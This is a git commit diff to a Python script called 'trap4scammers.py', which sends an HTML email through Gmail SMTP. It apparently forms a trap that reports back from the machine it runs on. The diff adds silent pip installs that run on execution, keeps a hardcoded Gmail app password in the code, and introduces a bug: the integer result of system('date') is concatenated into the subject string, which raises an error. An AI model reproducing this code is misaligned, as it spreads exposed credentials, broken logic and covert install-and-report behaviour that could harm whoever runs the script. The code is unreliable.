2223d9da01595250f8a060975ca69f7efaf9e866
Valerii Syroiezhin <v.syroiezhin@MacBook-Air-Valerii.local>
2022-08-01 20:12:10 +0300

    Update trap4scammers.py

--- trap4scammers.py
+++ trap4scammers.py
@@ -1,5 +1,9 @@
+from os import system
+system("pip install email-to")
+system("pip install secure-smtplib")
+
 from email.mime.text import MIMEText
-from datetime import datetime
+# from datetime import datetime
 from smtplib import SMTP
 from os import popen
 
@@ -12,7 +16,8 @@ def shape(myhtml):
   # create a password for the app bot and get the password by putting it in brackets
   server.login(sender, "eifjuipuczaxguxb") # https://myaccount.google.com/apppasswords
   msg = MIMEText(myhtml, "html")
-  msg["Subject"] = "Попался, который кусался! " + datetime.now().strftime("%d.%m.%Y - %H:%M:%S")
+  msg["Subject"] = "Попался, который кусался! " + system('date')
+  # + datetime.now().strftime("%d.%m.%Y - %H:%M:%S")
   msg['From'] = sender
   msg['To'] = destination
   server.sendmail(sender, destination, msg.as_string())
